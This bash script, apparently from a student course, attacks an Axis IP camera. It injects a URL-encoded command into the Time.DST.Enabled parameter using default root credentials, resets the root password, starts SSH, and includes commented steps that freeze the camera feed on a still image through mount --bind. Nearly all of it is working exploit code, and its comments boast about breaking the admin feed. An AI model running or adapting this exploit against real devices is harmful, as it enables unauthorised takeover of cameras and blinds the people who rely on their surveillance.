#! /bin/bash
echo "Hello ENGR100 :)"
# steps after root access:
# 1. copy the views.shtml to /tmp (prob under a diff name)
# 2. edit the copy in one of the following ways, depending on what works:
#   2a. grab a static image of the camera and replace every "/mjpg/video.mjpg" with that image. remember that "hacker view" will be this old link.
#   2b. find some way to directly edit the feed? idk lol
# 3. bind that edited views.shtml file (rename when copying to not confuse) with the real one.

# get root accsess: Refer to Camera Reverse Shell notes.txt on where these come from.
# expanded/unencoded command for ease of reading
# things in double # if just replacing the video dont work
# KEEP PERMISSIONS WHEN COPY

## cp -p /usr/html/view/view.shtml /tmp/edit.shtml
## curl -so /tmp/still.jpg "http://localhost:80/axis-cgi/jpg/image.cgi"
## chmod 640 /tmp/still.jpg
## chown -- "www:viewer" /tmp/still.jpg
## sed -i "s/\/mjpg\/video.mjpg/\/mjpg\/still.jpg/g" /tmp/edit.shtml
# mount --bind /tmp/still.jpg /usr/html/mjpg/video.mjpg
## mount --bind /tmp/edit.shtml /usr/html/view/view.shtml

# final
# change password, add ssh key and start service, and do monolith.
# printf "l33tP@ss\nl33tP@ss" | passwd 
# /usr/sbin/sshd
# monolith

_SERVER="192.168.1.109"
_INJECTED_COMMAND=";(printf$%7BIFS%7D%22l33tP@ss%5Cnl33tP@ss%22$%7BIFS%7D%5C%7C%5C$%7BIFS%7Dpasswd;/usr/sbin/sshd;monolith;);"
#curl "http://${_SERVER}/index.html/a.srv" --data "action=dbus&args=--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.setParameter string:root.Time.DST.Enabled string:${_INJECTED_COMMAND}"
#curl "http://${_SERVER}/index.html/a.srv" --data "action=dbus&args=--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SynchParameters"

curl --digest --user root:toor "http://${_SERVER}/axis-cgi/param.cgi?action=update&Time.DST.Enabled=${_INJECTED_COMMAND}"
echo "froze/broke admin feed, changed root password to \"l33tP@ss\" and check rtsp through for your stream. :)"
